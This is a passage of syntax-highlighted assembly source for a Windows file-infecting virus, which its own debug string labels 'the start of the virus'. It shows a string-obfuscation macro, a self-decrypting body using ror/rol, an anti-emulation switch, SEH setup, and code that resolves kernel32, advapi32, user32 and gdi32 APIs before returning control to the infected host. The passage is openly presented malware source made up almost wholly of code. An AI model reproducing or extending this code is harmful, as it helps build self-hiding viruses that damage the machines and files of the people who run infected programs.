                    </span><span class="sc5">ctrlByte</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ctrlByte</span><span class="sc0"> </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">mCRC32</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ctrlByte</span><span class="sc0"> </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">))</span><span class="sc0">
                </span><span class="sc9">endm</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">crcReg</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc5">ctrlByte</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc9">endm</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">crcReg</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">                                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc9">macro</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc0">                                 </span><span class="sc1">;this NOTs a string</span><span class="sc0">
      </span><span class="sc9">irpc</span><span class="sc0"> </span><span class="sc5">_x</span><span class="sc4">,&lt;</span><span class="sc5">string</span><span class="sc4">&gt;</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc5">notbyte</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc4">(</span><span class="sc12">'&amp;_x&amp;'</span><span class="sc4">)</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">notbyte</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">endm</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">endm</span><span class="sc0">                                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">PUSH_POP</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">pop_edi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                              </span><span class="sc1">;helps us to pop stuff...</span><span class="sc0">
         </span><span class="sc5">pop_esi</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">pop_ebp</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">pop_esp</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">pop_ebx</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">pop_edx</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">pop_ecx</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
         </span><span class="sc5">pop_eax</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">PUSH_POP</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">.data</span><span class="sc0">                                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">                                              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">                                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">xxx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">debug_start</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Here is the start of the virus.'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;Really!! ;-)</span><span class="sc0">
</span><span class="sc5">xxx</span><span class="sc4">:</span><span class="sc0">                                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pushad</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getdelta</span><span class="sc0">                               </span><span class="sc1">; Get the delta handle</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">getdelta</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getdelta</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                 </span><span class="sc1">;check if first gen</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">no_first</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">firstgen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">;mark the first generation</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">get_base</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_first</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">firstgen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">get_base</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">getimagebase</span><span class="sc0">                           </span><span class="sc1">; And the imagebase...</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">getimagebase</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ourpoint</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc4">+(</span><span class="sc5">ourpoint</span><span class="sc4">-</span><span class="sc5">start</span><span class="sc4">)-</span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">;before this eax equals</span><span class="sc0">
                                                   </span><span class="sc1">;imagebase+RVA(ourpoint)+</span><span class="sc0">
                                                   </span><span class="sc1">;RVA(code section)</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ourimagebase</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">over_data</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">imagebase</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00400000h</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ourimagebase</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">firstgen</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">over_data</span><span class="sc4">:</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">firstgen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">EncryptedArea</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DecryptOffset</span><span class="sc0">                          </span><span class="sc1">;very light internal</span><span class="sc0">
                                                   </span><span class="sc1">;decrypt module</span><span class="sc0">
</span><span class="sc5">DecryptOffset</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;no key, just ror/rol</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">EncryptedArea</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">DecryptOffset</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">end2</span><span class="sc4">-</span><span class="sc5">EncryptedArea</span><span class="sc4">)</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DecryptLoop</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jp</span><span class="sc0"> </span><span class="sc5">parity</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ror</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">do_decrypt</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">parity</span><span class="sc4">:</span><span class="sc0">                                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">do_decrypt</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">DecryptLoop</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
</span><span class="sc5">EncryptedArea</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                        </span><span class="sc1">;save additional deltas</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">ANTIEMU</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">delta2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">adjust</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ExceptionExit</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; Setup a SEH frame</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;ƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒƒ</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">copying</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;reset our syncronization</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">in_list</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;variables</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">free_routine</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">AVAILABLE</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crt_dir_flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">apihookfinish</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">module_names</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;decrypt module names</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">module_names_length</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">not_list</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;first let's locate the</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32_name</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;kernel32 base address</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateKernel32</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">k32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32apis</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel32addr</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">kernel32func</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateApis</span><span class="sc0">                             </span><span class="sc1">;and kernel32 apis</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">advapi32_name</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;locate advapi32</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateModuleBase</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc10">a32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">advapi32apis</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">advapi32addr</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">advapi32func</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateApis</span><span class="sc0">                             </span><span class="sc1">;and the apis</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">user32_name</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;locate user32</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateModuleBase</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">u32</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">user32apis</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">user32addr</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">user32func</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateApis</span><span class="sc0">                             </span><span class="sc1">;and it's apis</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnToHost</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gdi32_name</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;locate gdi32</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">LocateModuleBase</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
